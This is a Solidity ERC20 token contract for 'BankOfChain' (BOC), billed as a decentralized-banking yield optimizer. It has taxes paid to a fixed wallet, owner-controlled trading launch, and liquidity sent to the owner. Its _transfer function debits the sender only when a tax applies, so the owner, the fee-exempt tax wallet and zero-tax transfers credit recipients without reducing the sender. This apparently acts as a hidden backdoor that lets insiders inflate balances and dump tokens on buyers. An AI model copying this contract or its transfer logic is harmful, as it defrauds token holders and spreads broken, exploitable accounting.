// SPDX-License-Identifier: MIT

/*
The next generation of Decentralized Banking (DeB) Multichain yield optimizer

Website: https://www.chainbank.tech
Telegram: https://t.me/chainbank_erc20
Twitter: https://twitter.com/chainbank_erc20
*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract BOC is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals= 9;
    uint256 private constant _supply = 10 ** 9 * 10**_decimals;
    string private constant _name= "BankOfChain";
    string private constant _symbol= "BOC";

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=9;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=11;
    uint256 private _reduceSellTaxAt=11;
    uint256 private _preventSwapBefore=11;
    uint256 private _numBuyers=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 public _maxTransaction= 2 * 10 ** 7 * 10**_decimals;
    uint256 public _maxWallet= 2 * 10 ** 7 * 10**_decimals;
    uint256 public _feeSwapThreshold= 10 ** 5 * 10**_decimals;
    uint256 public maxTaxSwap= 10 ** 7 * 10**_decimals;
    address payable private _taxWallet = payable(0xf374F0273D04deb542d06Bf9145301Cc0aaE2002);

    IUniswapRouter private _dexRouter;
    address private _dexPair;
    bool private tradeEnabled;
    bool private swapping= false;
    bool private swapEnabled= false;

    event MaxTxAmountUpdated(uint _maxTransaction);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        _balances[address(this)] = _supply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), address(this), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxWallet = _maxTransaction = _supply;
        emit MaxTxAmountUpdated(_supply);
    }

    function sendETH(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradeEnabled, "Trading is already open");
        _dexRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouter), _supply);
        _dexPair = IUniswapFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _dexRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(_dexPair).approve(address(_dexRouter), type(uint).max);
        swapEnabled = true;
        tradeEnabled = true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    receive() external payable {}
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && !_isExcludedFromFee[from]) {
            taxAmount = amount.mul((_numBuyers > _reduceBuyTaxAt) ? _finalBuyTax  :_initialBuyTax).div(100);

            if (from == _dexPair && to != address(_dexRouter) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTransaction, "Exceeds the _maxTransaction.");
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the maxWalletSize.");
                _numBuyers++;
            }

            if (to == _dexPair && from != address(this)) {
                taxAmount = amount.mul((_numBuyers>_reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to == _dexPair && swapEnabled && contractTokenBalance > _feeSwapThreshold && _numBuyers > _preventSwapBefore && amount > _feeSwapThreshold) {
                swapTokensForEth(min(amount, min(contractTokenBalance, maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          _balances[from] = _balances[from].sub(amount);
          emit Transfer(from, address(this), taxAmount);
        }
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}